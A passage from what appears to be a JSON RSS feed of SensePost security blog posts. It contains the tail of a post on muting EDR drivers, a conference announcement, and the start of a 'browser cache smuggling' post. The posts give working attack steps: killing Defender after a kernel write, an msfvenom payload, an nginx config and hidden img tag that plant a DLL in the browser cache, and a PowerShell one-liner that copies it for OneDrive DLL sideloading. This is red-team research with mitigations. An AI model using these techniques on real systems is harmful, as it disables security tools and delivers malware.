zero\nEDRSnowblast.exe filter-mute --kernelmode --filter-index 9\n\n4. (optional) verify MaxConnections value using the –filter-enum option as seen previously\n5. identify the PID of Windows Defender usermode process and kill it\ntasklist | findstr MsMpEng.exe\nMsMpEng.exe                   2956 Services                   0    206,788 K\nc:\\pimpmypid_clt.exe /kill 2956\n6. copy our malicious payload created in step 3 and execute\ncopy z:\\iwanttobeflag.exe c:\\\nc:\\iwanttobeflag.exe\n\n7. bask in our success\nIf you prefer, you can watch the live demo video below.\n\n\n\n\nThis technique was successfully tested against Windows Defender and two other EDR vendors. \nHow to protect / detect ?\nWe must start by asking what are the “filter-mute” pre-requisites ?\nyou must use a Windows kernel R/W exploit primitive – if you want to use BYOVD (Bring Your Own Vulnerable Driver) you must have SeLoadDriverPrivilege, necessary for loading / unloading drivers (ex: local administrator, domain admin, domain print operator)\nyou must be able to kill (or restart) the EDR usermode application\nNow we could wonder if is it possible for Windows users to protect themselves? and yes some mitigations exist. Here are some recommendations:\napply Windows patches: it removes vulnerabilities from Windows kernel & drivers\nuse Microsoft VBS (enable HVCI): as you may have noticed, the attack vector used is BYOVD. This vector has been known for a long time and Microsoft did a great job to mitigate this with virtualization-based security (VBS) features available in Windows 10, Windows 11, Windows Server 2016, and later. More details on VBS in the Microsoft documentation: Virtualization-based Security (VBS)\nuse Microsoft recommended driver block rules available here\nuse Sysmon or Sigma rules: a huge list of known-vulnerable drivers is available on www.loldrivers.io and this project provides those kind of rules\nAnother question is: Can EDR vendors protect their drivers against this attack? Yes they can! \nThe fastest solution could be denylisting known-vulnerable drivers, avoiding them to be loaded. But this method has the same limitations as AV signatures; unknown vulnerable drivers won’t be blocked. \nBetter protections could be implemented by developers:\nalways verify that EDR_process.exe is able to connect to EDR_driver.sys communication port. An example of code that could achieve this: \nHANDLE hPort;\nHRESULT hr = ::FilterConnectCommunicationPort(L\"\\\\secureEDR\",0, nullptr, 0, nullptr, &hPort);\n\nif (FAILED(hr)) {\n   printf(\"Error connecting to EDR_driver.sys ! (HR=0x%08X)\\n\", hr);\n   if (hr == 0x800704D6) {\n      printf(\"ERROR_CONNECTION_COUNT_LIMIT : A connection to the server could not be made because the limit on the number of concurrent connections for this account has been reached.\\n\");\n   }\n}\n// Other common errors you should check are\n// ERROR_BAD_PATHNAME (HR=0x800700A1)\n// E_FILE_NOT_FOUND (HR=0x80070002)\n// E_ACCESSDENIED (HR=0x80070005)\n// ERROR_INVALID_NAME (HR=0x8007007B)\nStatic KDP: an EDR driver should call the MmProtectDriverSection API for protecting a section of its image\nDynamic KDP: allows a driver to allocate and initialise read-only memory using services provided by a secure pool, which is managed by the secure kernel, using ExAllocatePool3 API.\nMore details on KDP in the post from Andrea Allievi: Introducing Kernel Data Protection\nResources and acknowledgments\nI would like to give you the most relevant resources used during this journey and also thanks those people helping this research to be easier.\nThank you for sharing your knowledge with the community!\n– Yarden Shafir (@yarden_shafir) for the blog – Investigating Filter Communication Ports\n– Christopher Vella (@kharosx0) for the talk – CrikeyCon 2019 talk – Reversing & bypassing EDRs\n– Zach Stein (@synzack21) for the blog – Blinding EDR On Windows\n– Alexandre Borges (@ale_sp_brazil) for the 109 pages (!) – Exploiting Reversing (ER) series\n– Pavel Yosifovich (@zodiacon) for the book – Windows Kernel Programming\n– Alex Ionescu (@aionescu) for the talks – REcon 2013 – I got 99 problems but a kernel pointer ain’t one\n– Connor McGarr (@33y0re) for the blog – Exploit Development: No Code Execution? No Problem! Living The Age of VBS, HVCI, and Kernel CFG\nI hope you learnt something, thanks for reading!\nEXTRA MILE: “kernel walking, 10 steps to get access to MaxConnections”\nAlright you’re curious, the hacker spirit is great! Want to know how to get MaxConnections value? The method below shows how to get the MaxConnections value of the driver named bindflt.sys using Windbg. As a reminder / help, please find the hiking map below.\n\nTL;DR: the full solution is available in the map at the end of this section\nStep 0 – Identify the entry point\nThe starting point is the structure named FLTMGR!FltGlobals. You can get the address directly:\nkd> ? FLTMGR!FltGlobals\nBut if you need to retrieve this address using a memory leak, this path works like a charm:\n– get fltmgr.sys start address\nlmdvm fltmgr\n– get FltEnumerateFilters function offset, and in this function the offset of lea rcx, [FLTMGR!FltGlobals+0x58] instruction\nu FLTMGR!FltEnumerateFilters L15\n– compute FLTMGR!FltGlobals start address: 0xfffff8061ea8b600\n? fffff806`1ea8b658 - 0x58\n\nStep 1 – compute the FrameList field address stored in FLTMGR!FltGlobals: 0xfffff8061ea8b6c0\nkd> ? fffff806`1ea8b600 + 0x58 + 0x68\nStep 2 – use pointer indirection and get the first frame (Links filed) address in FLTMGR!_FLTP_FRAME: 0xffffca0c38c61058\nkd> ? poi(fffff806`1ea8b6c0)\nStep 3 – compute the First frame start address: 0xffffca0c38c61050\nkd> ? ffffca0c`38c61058 - 0x008\nStep 4 – compute the Filter List address: 0xffffca0c38c61100\nkd> ? ffffca0c`38c61050 + 0x48 + 0x68 + 0x000\nStep 5 – use pointer indirection and get the First filter (PrimaryLink field) address: 0xffffca0c386e8020\nkd> ? poi(ffffca0c`38c61100)\nStep 6 – compute the First filter address (Base of FLTMGR!_FLT_FILTER): 0xffffca0c386e8010\nkd> ? ffffca0c`386e8020 - 0x010\nOk nice we can verify and visualize where we are using Windbg filter kernel debugger (fltkd) command named frames:\n\nStep 7 – compute the Server Ports List address: 0xffffca0c386e8250\nkd> ? ffffca0c`386e8010 + 0x208 + 0x038 + 0x000\nStep 8 – use pointer indirection and get the First Server Ports Object address (FLTMGR!_FLT_SERVER_PORT_OBJECT FilterLink address): 0xffffca0c3eaf73f0\nkd> ? poi(ffffca0c`386e8250)\nStep 9 – compute the MaxConnections field address: 0xffffca0c3eaf7430\nkd> ? ffffca0c`3eaf73f0 +0x040\nStep 10 – use pointer indirection and get the MaxConnections value: 1000\nkd> .formats poi(ffffca0c`3eaf7430)\nor\nkd> dt _FLT_SERVER_PORT_OBJECT ffffca0c`3eaf73f0\nFinally! You got it!\n\nFinal steps – set the MaxConnections value to zero and kill EDR_Process.exe\nkd> eq 0xffffca0c3eaf7430 0\nand\nkd> !process 0 0 MsMpEng.exe\nPROCESS ffffa40a23a5f340\nkd> .kill ffffa40a23a5f340\nBecause it was a nightmare for me to visualise where I am in kernel memory, what are the fields of the data structures, the links between data structures, what offsets should I use, etc I made the map below (which also includes Windbg commands).\n\n\n\n\nMaybe (as I did) are you wondering what are those values used in computations: yes those are offsets. \nOffsets could change after Windows updates, personally I use a customised version of EDRSandblast’s ExtractOffsets.py script (available in EDRSnowblast). Output example is shown below.\n\nBecause we know the method and the offsets, we can automate this! PoC or GTFO, the code to do so can be found at EDRSnowblast.\nHappy hacking!",
      "content": "For our annual internal hacker conference dubbed SenseCon in 2023, I decided to take a look at communication between a Windows driver and its user-mode process. Here are some details about that journey.\n\n",
      "contentSnippet": "For our annual internal hacker conference dubbed SenseCon in 2023, I decided to take a look at communication between a Windows driver and its user-mode process. Here are some details about that journey.",
      "guid": "https://sensepost.com/blog/2023/filter-mute-operation-investigating-edr-internal-communication/",
      "isoDate": "2023-07-28T14:38:54.000Z",
      "itunes": {}
    },
    {
      "title": "Orange Cyberdefense at Hacker Summer Camp",
      "link": "https://sensepost.com/blog/2023/orange-cyberdefense-at-hacker-summer-camp/",
      "pubDate": "Mon, 17 Jul 2023 15:55:03 +0000",
      "content:encoded": "<p>It&#x2019;s that time of year again where we head out to the desert, more specifically Las Vegas, for what is known as Hacker Summer Camp to attend Black Hat and DEF CON 31! Like previous years, the SensePost team will be present in full force delivering talks, training and hanging out at numerous occasions. For an idea on what we&#x2019;ve got lined up, check out the rest of this blog post. If you&#x2019;re keen to meet up, feel free to reach out!</p>\n\n\n\n<h2 class=\"wp-block-heading\">Training</h2>\n\n\n\n<p>Celebrating being a part of Black Hat for 22 years and more recently DEF CON and Ringzer0, we&#x2019;re always excited for opportunities to share knowledge (and geek out on all things offensive security).</p>\n\n\n\n<p>This year we&#x2019;re delivering numerous courses at Hacker Summer Camp ranging from Infrastructure, Web, Mobile, Wi-Fi and Active Directory hacking. Whether you&#x2019;re seeking introductory insights, intermediate skill-building, or specialised technical training, we have crafted courses that cater to various proficiency levels and interests.</p>\n\n\n\n<p>We are giving the following courses at Black Hat US 23:</p>\n\n\n\n<ul>\n<li><a href=\"https://twitter.com/Stingray_ZA\">William Vermaak</a> and <a href=\"https://twitter.com/JCoertze\">Jacques Coertze</a> are presenting two sessions of &#x201C;A Journey Into Mobile Application Hacking (iOS &amp; Android)&#x201D; on <a href=\"https://www.blackhat.com/us-23/training/schedule/#a-journey-into-mobile-application-hacking-ios--android-30662\">Saturday, 5th of August</a> and <a href=\"https://www.blackhat.com/us-23/training/schedule/#a-journey-into-mobile-application-hacking-ios--android-306621675465009\">Monday, 7th of August</a>. </li>\n\n\n\n<li><a href=\"https://twitter.com/mariankabotes\">Marianka Botes</a> and <a href=\"https://twitter.com/cyber_protect\">Aubrey Labuschagne</a> are presenting two sessions of &#x201C;Hands-On Hacking Fundamentals &#x2013; 2023 Edition&#x201D; on <a href=\"https://www.blackhat.com/us-23/training/schedule/#hands-on-hacking-fundamentals---2023-edition-30624\">Saturday, 5th of August</a> and <a href=\"https://www.blackhat.com/us-23/training/schedule/#hands-on-hacking-fundamentals---2023-edition-306241675698899\">Monday, 7th of August</a>.</li>\n\n\n\n<li><a href=\"https://twitter.com/R4g3D_\">Darryn Cull</a> and <a href=\"https://twitter.com/zeroice28\">Deon Willemse</a> are presenting &#x201C;<a href=\"https://www.blackhat.com/us-23/training/schedule/#tactical-hacking-essentials---2023-edition-30629\">Tactical Hacking Essentials &#x2013; 2023 Edition</a>&#x201D; on Saturday, 5th of August.</li>\n\n\n\n<li><a href=\"https://twitter.com/_cablethief\">Michael Kruger</a> and <a href=\"https://twitter.com/TH3_GOAT_FARM3R\">Szymon Ziolkowski</a> are presenting &#x201C;<a href=\"https://www.blackhat.com/us-23/training/schedule/#unplugged-modern-wi-fi-hacking-30636\">Unplugged: Modern Wi-Fi Hacking</a>&#x201D; on Saturday, 5th of August.</li>\n</ul>\n\n\n\n<p><a href=\"https://twitter.com/xpirabit\">John Iatridis</a> will be presenting &#x201C;<a href=\"https://www.ringzer0.training/trainings/advanced-active-directory-exploitation.html\">Advanced Active Directory Exploitation</a>&#x201D; at Ringzer0 on the 5th of August.</p>\n\n\n\n<p>We will also provide three courses at DEF CON 31, which will take place on the 14th and 15th of August:</p>\n\n\n\n<ul>\n<li>Aubrey Labuschagne is presenting &#x201C;<a href=\"https://training.defcon.org/products/api-exploration-and-exploitation\">API Exploration and Exploitation</a>&#x201C;. </li>\n\n\n\n<li>John Iatridis will be presenting &#x201C;<a href=\"https://training.defcon.org/products/advanced-active-directory-manipulation\">Advanced Active Directory Manipulation</a>&#x201C;.</li>\n\n\n\n<li>Szymon Ziolkowski is presenting &#x201C;<a href=\"https://training.defcon.org/products/web-hacking-bootcamp-orange-cyberdefense\">Web Hacking Bootcamp</a>&#x201C;.</li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\">Talks</h2>\n\n\n\n<p>Each year we encourage everyone internally to share their research at conferences like Black Hat and DEF CON. This year is no different, and we have two talks taking place at DEF CON 31.</p>\n\n\n\n<p>1 &#x2013; <a href=\"https://twitter.com/felmoltor\">Felipe Molina</a> de la Torre at DEF CON 31, <a href=\"https://www.appsecvillage.com/events/dc-2023\">AppSec Village</a></p>\n\n\n\n<p>Felipe will be talking about the current, arguably surprising state of Content Security Policies in the wild using data collected by scanning top one million websites. Using an assessment where Felipe identified a possible XSS vector and CSP prevented exploitation, Felipe found that he could abuse a trust relationship with a third-party to exploit the XSS vulnerability for impact. Curious about how prevalent and effective CSP policies are today? This one is for you.</p>\n\n\n\n<p>2 &#x2013; Thomas Bygodt at the DEF CON 31, <a href=\"https://dchhv.org/\">Hardware Hacking Village</a></p>\n\n\n\n<p>For the past couple years Thomas has focused on hardware hacking, primarily motivated by the need to know more about it. Thomas did so by looking for vulnerabilities within smart locks, where his journey resulted in some great finds that include a vulnerability that would allow you to remotely open several thousand certain smart locks. In this talk Thomas will go over his methodology, the issues he found as well as to show that hardware hacking isn&#x2019;t always as hard as it looks. </p>\n\n\n\n<p></p>\n\n\n\n<p></p>\n\n\n\n<p> </p>\n",
      "content:encodedSnippet": "It’s that time of year again where we head out to the desert, more specifically Las Vegas, for what is known as Hacker Summer Camp to attend Black Hat and DEF CON 31! Like previous years, the SensePost team will be present in full force delivering talks, training and hanging out at numerous occasions. For an idea on what we’ve got lined up, check out the rest of this blog post. If you’re keen to meet up, feel free to reach out!\nTraining\nCelebrating being a part of Black Hat for 22 years and more recently DEF CON and Ringzer0, we’re always excited for opportunities to share knowledge (and geek out on all things offensive security).\nThis year we’re delivering numerous courses at Hacker Summer Camp ranging from Infrastructure, Web, Mobile, Wi-Fi and Active Directory hacking. Whether you’re seeking introductory insights, intermediate skill-building, or specialised technical training, we have crafted courses that cater to various proficiency levels and interests.\nWe are giving the following courses at Black Hat US 23:\nWilliam Vermaak and Jacques Coertze are presenting two sessions of “A Journey Into Mobile Application Hacking (iOS & Android)” on Saturday, 5th of August and Monday, 7th of August. \nMarianka Botes and Aubrey Labuschagne are presenting two sessions of “Hands-On Hacking Fundamentals – 2023 Edition” on Saturday, 5th of August and Monday, 7th of August.\nDarryn Cull and Deon Willemse are presenting “Tactical Hacking Essentials – 2023 Edition” on Saturday, 5th of August.\nMichael Kruger and Szymon Ziolkowski are presenting “Unplugged: Modern Wi-Fi Hacking” on Saturday, 5th of August.\nJohn Iatridis will be presenting “Advanced Active Directory Exploitation” at Ringzer0 on the 5th of August.\nWe will also provide three courses at DEF CON 31, which will take place on the 14th and 15th of August:\nAubrey Labuschagne is presenting “API Exploration and Exploitation“. \nJohn Iatridis will be presenting “Advanced Active Directory Manipulation“.\nSzymon Ziolkowski is presenting “Web Hacking Bootcamp“.\nTalks\nEach year we encourage everyone internally to share their research at conferences like Black Hat and DEF CON. This year is no different, and we have two talks taking place at DEF CON 31.\n1 – Felipe Molina de la Torre at DEF CON 31, AppSec Village\nFelipe will be talking about the current, arguably surprising state of Content Security Policies in the wild using data collected by scanning top one million websites. Using an assessment where Felipe identified a possible XSS vector and CSP prevented exploitation, Felipe found that he could abuse a trust relationship with a third-party to exploit the XSS vulnerability for impact. Curious about how prevalent and effective CSP policies are today? This one is for you.\n2 – Thomas Bygodt at the DEF CON 31, Hardware Hacking Village\nFor the past couple years Thomas has focused on hardware hacking, primarily motivated by the need to know more about it. Thomas did so by looking for vulnerabilities within smart locks, where his journey resulted in some great finds that include a vulnerability that would allow you to remotely open several thousand certain smart locks. In this talk Thomas will go over his methodology, the issues he found as well as to show that hardware hacking isn’t always as hard as it looks.",
      "content": "It&amp;#x2019;s that time of year again where we head out to the desert, more specifically Las Vegas, for what is known as Hacker Summer Camp to attend Black Hat and DEF CON 31! Like previous years, the SensePost team will be present in full force delivering talks, training and hanging out at numerous occasions. For an idea on what we&amp;#x2019;ve got lined up, check out the rest of this blog post. If you&amp;#x2019;re keen to meet up, feel free to reach out!\n\n",
      "contentSnippet": "It&#x2019;s that time of year again where we head out to the desert, more specifically Las Vegas, for what is known as Hacker Summer Camp to attend Black Hat and DEF CON 31! Like previous years, the SensePost team will be present in full force delivering talks, training and hanging out at numerous occasions. For an idea on what we&#x2019;ve got lined up, check out the rest of this blog post. If you&#x2019;re keen to meet up, feel free to reach out!",
      "guid": "https://sensepost.com/blog/2023/orange-cyberdefense-at-hacker-summer-camp/",
      "isoDate": "2023-07-17T15:55:03.000Z",
      "itunes": {}
    },
    {
      "title": "Browsers’ cache smuggling",
      "link": "https://sensepost.com/blog/2023/browsers-cache-smuggling/",
      "pubDate": "Mon, 10 Jul 2023 08:33:20 +0000",
      "content:encoded": "<p>On red team engagements, I often use social engineering to get one of my client&#x2019;s employees to run my malicious code on their machines, allowing me to get access to their system. A typical approach I&#x2019;ve used is to call them up, tell them I&#x2019;m from IT support, and then get them to go to an official looking web page that contains some PowerShell code they need to run, to fix some made-up problem.</p>\n\n\n\n<p>However, this approach is well known to security vendors, and these days almost all anti-malware and EDR products will block or at least alert on any suspicious looking PowerShell code, especially code that downloads a payload and then executes it. I wanted to find another, stealthier way to deliver a payload to targeted users.</p>\n\n\n\n<p>So, the first question I asked myself is what mechanisms are used by an operating system on a daily basis that I could manipulate in order to deliver malware? And then it popped into my head: browser cache!</p>\n\n\n\n<p>In this blog post I&#x2019;ll present a technique in which an attacker social engineers a target employee to visit a web site. The web site will then silently place a DLL payload in the browser&#x2019;s cache, disguised as an image. On the same web site, the user is socially engineered to run a benign looking PowerShell one liner that moves the DLL payload to a folder, where it will be automatically executed. I&#x2019;ll also show some other interesting things I found regarding Defender while doing this research.</p>\n\n\n\n<h2 class=\"wp-block-heading\">I/ What is browser cache?</h2>\n\n\n\n<p>When you navigate on the Internet, your browser loads a ton of files such as images, videos, CSS, JavaScript and so on. Loading the same page twice means that the browser will download the same files twice. That&#x2019;s useless and it takes a lot of CPU resources as well as network bandwidth.</p>\n\n\n\n<p>Modern browsers implement a mechanism that allows them to store these files locally so that they don&#x2019;t need to download them every time. This mechanism is called the browser cache.</p>\n\n\n\n<p>If we look at how Firefox on Windows works, we see that there is a Firefox directory in AppData/Local, that stores what looks like cached files:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/firefox_cache_content.png\"><img loading=\"lazy\" decoding=\"async\" width=\"860\" height=\"424\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/firefox_cache_content.png\" alt=\"\" class=\"wp-image-67745\"></a></figure></div>\n\n\n<p>And there are quite a few files, around 300MB:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/image-12.png\"><img loading=\"lazy\" decoding=\"async\" width=\"358\" height=\"261\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/image-12.png\" alt=\"\" class=\"wp-image-67742\"></a></figure></div>\n\n\n<p>Now let&#x2019;s purge this directory and navigate to the https://orangecyberdefense.com website. You will see that new files are added while we navigate:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/cache_filling.png\"><img loading=\"lazy\" decoding=\"async\" width=\"941\" height=\"489\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/cache_filling.png\" alt=\"\" class=\"wp-image-67746\"></a></figure></div>\n\n\n<p>So, it seems we have found a mechanism that automatically downloads files!</p>\n\n\n\n<p>However, browsers will not cache just any file provided by a server. It will cache static resources &#x2013; files whose content is not going to change often. As such, our browsers will mostly cache images, videos and sometimes JS/CSS. It would be great if we could somehow trick a browser into caching files that contain a binary payload, such as a DLL or EXE file. How do we do that?</p>\n\n\n\n<h2 class=\"wp-block-heading\">II/ Manipulating browsers&#x2019; cache mechanisms</h2>\n\n\n\n<p>To detect which files to cache, browsers will mainly rely on the Content-Type header that is sent by the web server. For example, in the screenshot below we can see that the file &#x201C;<code>avatar.jpg</code>&#x201D; was sent by the server and its content type is &#x201C;<code>image/jpeg</code>&#x201D;:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/content_type.png\"><img loading=\"lazy\" decoding=\"async\" width=\"856\" height=\"361\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/content_type.png\" alt=\"\" class=\"wp-image-67747\"></a></figure></div>\n\n\n<p>On Linux, web servers typically use the <code>/etc/mime.types</code> file, to know which content type it should return for a specific file. The content of <code>/etc/mime.types</code> typically looks like this:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/mimes_types.png\"><img loading=\"lazy\" decoding=\"async\" width=\"741\" height=\"773\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/mimes_types.png\" alt=\"\" class=\"wp-image-67748\"></a></figure></div>\n\n\n<p>This file contains the content-type values linked to the extension of the files. As such, when the webserver (Nginx in this case) sees that the file <code>avatar.jpg</code> is requested, it will check in the <code>mime.types</code> file to determine what is the content-type of the .jpg extension, and see that it is <code>image/jpeg</code>:</p>\n\n\n\n<p>As an attacker, we can override these values. Remember, our goal is to force the download of either a DLL or an EXE file. To do so, we&#x2019;ll simply have to change the content type related to the DLL and EXE files from <code>application/x-msdos-program</code> to <code>image/jpeg</code>. This is simply done with the following line in your Nginx configuration:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>types { } default_type image/jpeg;</code></pre>\n\n\n\n<p>This nullifies the in-memory mime type mapping, and then sets the default content type to &#x201C;<code>image/jpg</code>&#x201D; for unknown types (i.e. all files, since we nuked the mappings first). Enclosing this in a &#x201C;location&#x201D; block which only matches your payload(s) will achieve the desired effect without turning everything into an &#x201C;image&#x201D;. See part III below for the complete config in context.</p>\n\n\n\n<p>Next, we will have to generate two things:</p>\n\n\n\n<ul>\n<li>A DLL, in this case a simple one that will run calc.exe generated via MSFVenom:</li>\n</ul>\n\n\n\n<pre class=\"wp-block-code\"><code>msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f dll &gt; calc.dll</code></pre>\n\n\n\n<ul>\n<li>An HTML page in which the DLL is embedded in a img tag:</li>\n</ul>\n\n\n\n<pre class=\"wp-block-code\"><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n        &lt;body&gt;\n                &lt;h1&gt;Browser cache smuggling&lt;/h1&gt;\n                &lt;img src=&quot;calc.dll&quot; style=&quot;display: none;&quot;&gt;&lt;/img&gt;\n        &lt;/body&gt;\n&lt;/html&gt;</code></pre>\n\n\n\n<p>We then empty Firefox&#x2019;s cache, reload the HTML page and see that the file was downloaded:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/image-15.png\"><img loading=\"lazy\" decoding=\"async\" width=\"570\" height=\"216\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/image-15.png\" alt=\"\" class=\"wp-image-70530\"></a></figure>\n\n\n\n<p>Considering the size of the cached files we can conclude that the file starting with 75E&#x2026; Is our calc DLL. To be sure, we can load the following page on Firefox:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>about:cache?storage=disk</code></pre>\n\n\n\n<p>That is listing all the cached files on Firefox. And if we do a string lookup, we&#x2019;ll see that the <code>calc.dll</code> was cached:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/calc_cache_entry.png\"><img loading=\"lazy\" decoding=\"async\" width=\"879\" height=\"443\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/calc_cache_entry.png\" alt=\"\" class=\"wp-image-67751\"></a></figure></div>\n\n\n<p>Which means that the DLL was effectively delivered to the system. And what if I told you that this delivery method is not flagged by anti-virus? Yup! Defender is running on the Windows machine that is my target and it&#x2019;s not yelling anything. Know why? Because when the DLL was downloaded and stored in the cache, it was renamed to a random filename without an extension:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/dll_renamed.png\"><img loading=\"lazy\" decoding=\"async\" width=\"741\" height=\"247\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/dll_renamed.png\" alt=\"\" class=\"wp-image-67752\"></a></figure></div>\n\n\n<p>As such, Defender is not scanning the file and our DLL can stay there for as long as we need!</p>\n\n\n\n<h2 class=\"wp-block-heading\">III/ What about execution ?</h2>\n\n\n\n<p>A typical way to get this working is to social engineer a user, telling them there is something wrong with their system, and that they need to run a command to fix it. We tell them that the command is on an official looking web page. When the page loads, the DLL gets cached onto their system. The user gets the command from the web page, and runs it, which causes the already cached DLL to be executed. With this approach, we ensure that the DLL is still cached when the user runs the command.</p>\n\n\n\n<p>The key differentiator between this approach, and social engineering a user to run a C2 stager command, is that the command we get the user to run doesn&#x2019;t download a malicious payload, as its already on the system, cached by the browser. The idea is to try and make the command as benign looking as possible, to avoid suspicion or detection, and let Firefox do the dirty work by caching the malware DLL file.</p>\n\n\n\n<p>To make this work, we need a way to find our DLL between all the other files that are cached by the browser.</p>\n\n\n\n<p>If we take a closer look at the size of the cached DLL and the size of the DLL itself, we will see that the cached one is slightly bigger:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/size_difference.png\"><img loading=\"lazy\" decoding=\"async\" width=\"783\" height=\"530\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/size_difference.png\" alt=\"\" class=\"wp-image-67753\"></a></figure></div>\n\n\n<p>The reason is that the cached file is not just the DLL, it&#x2019;s a file that contains both the DLL file&#x2019;s content as well as metadata. Amongst the metadata, there is the HTTP response of the Nginx server, containing a few HTTP headers:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/metadata.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"864\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/metadata-1024x864.png\" alt=\"\" class=\"wp-image-67754\"></a></figure></div>\n\n\n<p>As such, all we need to do is to create a flag in the HTTP response of the server that will allow us to identify our DLL. We can accomplish this by modifying the Nginx configuration file in the following way:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>server {\n\tlisten 80 default_server;\n\tlisten [::]:80 default_server;\n\troot /var/www/html;\n\tindex index.html index.htm index.nginx-debian.html;\n\tserver_name _;\n\n\t# Adding the HTTP header TAG used to find the real DLL\n\tlocation /calc.dll {\n\t\t# Override the mime type\n\t\ttypes { } default_type image/jpeg;\n\t\tadd_header Tag DLLHERE;\n\t}\n}</code></pre>\n\n\n\n<p>If we reload the HTML page, we see that when the server is requested to provide the <code>calc.dll</code> file, its response contains an additional HTTP header that marks our DLL:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/tag_here.png\"><img loading=\"lazy\" decoding=\"async\" width=\"764\" height=\"825\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/tag_here.png\" alt=\"\" class=\"wp-image-67755\"></a></figure></div>\n\n\n<p>Using PowerShell or batch we can search for this specific string to find our DLL in the local cache directory:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/dll_found.png\"><img loading=\"lazy\" decoding=\"async\" width=\"937\" height=\"164\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/dll_found.png\" alt=\"\" class=\"wp-image-67756\"></a></figure></div>\n\n\n<p>At this point we know where our DLL is, so let&#x2019;s try executing it.</p>\n\n\n\n<p>While doing this research I realized that as soon as I renamed the cache file to &#x201C;<code>calc.dll</code>&#x201D;, the anti-virus flagged it as being malicious (msfvenom you know&#x2026;). I tried a lot of things until I realized that rundll32 can execute a DLL that hasn&#x2019;t got the .dll extension:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/dll_without_dot.png\"><img loading=\"lazy\" decoding=\"async\" width=\"849\" height=\"588\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/dll_without_dot.png\" alt=\"\" class=\"wp-image-67757\"></a></figure></div>\n\n\n<p>All you need to do is to append a dot to the cached filename and rundll32 will execute it. Even stranger, we saw before that the cached file is not just the DLL but also metadata, yet rundll32 doesn&#x2019;t care about that and will execute the DLL.</p>\n\n\n\n<p>Getting a user to execute rundll32 may set off some alarms, even if the DLL is already on the user&#x2019;s file system. An alternative approach may be simply to move the existing DLL into place, so that it gets executed when the user opens another application. This results in a far more benign command, that doesn&#x2019;t download or execute anything itself, it only moves an existing file. However, this approach does require that your malicious DLL doesn&#x2019;t get statically detected by AV.</p>\n\n\n\n<p>The following PowerShell one liner will look for the DLL in the cache directory and move it to an appropriate place, such as the OneDrive folder in order to launch a DLL side loading attack:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>foreach($f in @(&quot;$env:LOCALAPPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\cache2\\entries\\&quot;)){gci $f -r|%{if(Select-String -Pattern &quot;DLLHERE&quot; -Path $_.FullName){cp $_.FullName $env:LOCALAPPDATA\\Microsoft\\OneDrive\\CRYPTBASE.dll}}}</code></pre>\n\n\n\n<p>Next time OneDrive is launched, your malware will be too! </p>\n\n\n\n<h2 class=\"wp-block-heading\">IV/ What about Google Chrome ?</h2>\n\n\n\n<p>The way Google Chrome stores files in its cache is a little more complicated to exploit. Indeed, files are not stored individually, they are stored in multiple databases located in the <code>%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cache\\Cache_Data</code> folder:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/image-9.png\"><img loading=\"lazy\" decoding=\"async\" width=\"706\" height=\"270\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/image-9.png\" alt=\"\" class=\"wp-image-70512\"></a></figure>\n\n\n\n<p>As such, retrieving cached files means manipulating the database and this is not easy, especially with PowerShell. At this 